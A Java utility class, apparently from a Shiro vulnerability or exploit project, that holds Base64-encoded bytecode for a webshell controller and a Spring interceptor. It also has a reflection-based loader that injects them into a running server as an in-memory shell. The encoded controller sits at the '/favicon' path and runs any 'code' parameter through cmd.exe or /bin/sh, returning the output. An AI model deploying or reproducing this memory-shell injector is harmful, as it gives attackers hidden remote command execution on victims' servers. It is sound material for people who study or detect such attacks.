package com.shiro.vuln.util;

import org.apache.tomcat.util.codec.binary.Base64;
import sun.reflect.ReflectionFactory;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class ClassUtil extends ClassLoader {
    public final static String CONTROLLER_STRING = "yv66vgAAADQAigoAIQBGCABHCwBIAEkLAEoASwgATAgATQoATgBPCgAMAFAIAFEKAAwAUgcAUwcAVAgAVQgAVgoACwBXCABYCABZBwBaCgALAFsKAFwAXQoAEgBeCABfCgASAGAKABIAYQoAEgBiCgASAGMKAGQAZQoAZABmCgBkAGMLAEoAZwcAaAcAaQcAagEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQArTGNvbS9zaGlyby92dWxuL0NvbnRyb2xsZXIvU2hlbGxDb250cm9sbGVyOwEABWxvZ2luAQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcAVAcAawcAUwcAWgcAaAEAEE1ldGhvZFBhcmFtZXRlcnMBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQA4TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZzsBAAV2YWx1ZQEACC9mYXZpY29uAQAKU291cmNlRmlsZQEAFFNoZWxsQ29udHJvbGxlci5qYXZhAQArTG9yZy9zcHJpbmdmcmFtZXdvcmsvc3RlcmVvdHlwZS9Db250cm9sbGVyOwwAIgAjAQAEY29kZQcAbAwAbQBuBwBvDABwAHEBAAABAAdvcy5uYW1lBwByDABzAG4MAHQAdQEAA3dpbgwAdgB3AQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAIgB4AQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAHkAegcAewwAfAB9DAAiAH4BAAJcQQwAfwCADACBAIIMAIMAdQwAhAAjBwBrDACFAIYMAIcAIwwAiACJAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAKWNvbS9zaGlyby92dWxuL0NvbnRyb2xsZXIvU2hlbGxDb250cm9sbGVyAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAVjbG9zZQEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAlzZW5kRXJyb3IBAAQoSSlWACEAIAAhAAAAAAACAAEAIgAjAAEAJAAAAC8AAQABAAAABSq3AAGxAAAAAgAlAAAABgABAAAACwAmAAAADAABAAAABQAnACgAAAABACkAKgADACQAAAGoAAYACAAAALMrEgK5AAMCAE4suQAEAQA6BC3GAJMSBToFEga4AAe2AAgSCbYACpkAIbsAC1kGvQAMWQMSDVNZBBIOU1kFLVO3AA86BqcAHrsAC1kGvQAMWQMSEFNZBBIRU1kFLVO3AA86BrsAElkZBrYAE7YAFLcAFRIWtgAXOgcZB7YAGJkACxkHtgAZpwAFGQU6BRkHtgAaGQQZBbYAGxkEtgAcGQS2AB2nAAwsEQGUuQAeAgCnAAROsQABAAAArgCxAB8AAwAlAAAASgASAAAAEAAJABEAEQASABUAEwAZABUAKQAWAEcAGABiABoAeAAbAIwAHACRAB0AmAAeAJ0AHwCiACAApQAhAK4AJACxACMAsgAlACYAAABcAAkARAADACsALAAGABkAiQAtAC4ABQBiAEAAKwAsAAYAeAAqAC8AMAAHAAkApQAxAC4AAwARAJ0AMgAzAAQAAACzACcAKAAAAAAAswA0ADUAAQAAALMANgA3AAIAOAAAACkACP4ARwcAOQcAOgcAOfwAGgcAO/wAJQcAPEEHADn4ABr5AAhCBwA9AAA+AAAACQIANAAAADYAAAA/AAAADgABAEAAAQBBWwABcwBCAAIAQwAAAAIARAA/AAAABgABAEUAAA==";
    public final static String INTERCEPTOR_STRING = "yv66vgAAADQAKwoABgAbCwAcAB0IAB4KAB8AIAcAIQcAIgcAIwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAwTG9yZy9zdTE4L21lbXNoZWxsL3NwcmluZy9vdGhlci9UZXN0SW50ZXJjZXB0b3I7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAKRXhjZXB0aW9ucwcAJAEAClNvdXJjZUZpbGUBABRUZXN0SW50ZXJjZXB0b3IuamF2YQwACAAJBwAlDAAmACcBABBpJ20gaW50ZXJjZXB0b3J+BwAoDAApACoBAC5vcmcvc3UxOC9tZW1zaGVsbC9zcHJpbmcvb3RoZXIvVGVzdEludGVyY2VwdG9yAQAQamF2YS9sYW5nL09iamVjdAEAMm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgABAAcAAAACAAEACAAJAAEACgAAAC8AAQABAAAABSq3AAGxAAAAAgALAAAABgABAAAACwAMAAAADAABAAAABQANAA4AAAABAA8AEAACAAoAAABZAAIABAAAAA0suQACAQASA7YABASsAAAAAgALAAAACgACAAAADwALABAADAAAACoABAAAAA0ADQAOAAAAAAANABEAEgABAAAADQATABQAAgAAAA0AFQAWAAMAFwAAAAQAAQAYAAEAGQAAAAIAGg==";

    public static Class<?> getClass(String ClassCode) throws IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, InstantiationException {
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        byte[] bytes = Base64.decodeBase64(ClassCode);

        Method method = null;
        Class<?> clz    = loader.getClass();
        while (method == null && clz != Object.class) {
            try {
                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            } catch (NoSuchMethodException ex) {
                clz = clz.getSuperclass();
            }
        }

        if (method != null) {
            method.setAccessible(true);
            return (Class<?>) method.invoke(loader, bytes, 0, bytes.length);
        }

        return null;
    }
    /*public static Class<?> getClass0(String folder, String className) throws IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, InstantiationException {
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        FileInputStream fis = new FileInputStream(new File(folder+className+".class"));
        byte[] buf = new byte[1024];
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int len;
        while((len=fis.read(buf))!=-1){
            baos.write(buf,0, len);
        }
        byte[] bytes = baos.toByteArray();

        Method method = null;
        Class<?> clz    = loader.getClass();
        while (method == null && clz != Object.class) {
            try {
                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            } catch (NoSuchMethodException ex) {
                clz = clz.getSuperclass();
            }
        }

        if (method != null) {
            method.setAccessible(true);
            return (Class<?>) method.invoke(loader, bytes, 0, bytes.length);
        }

        return null;
    }*/
}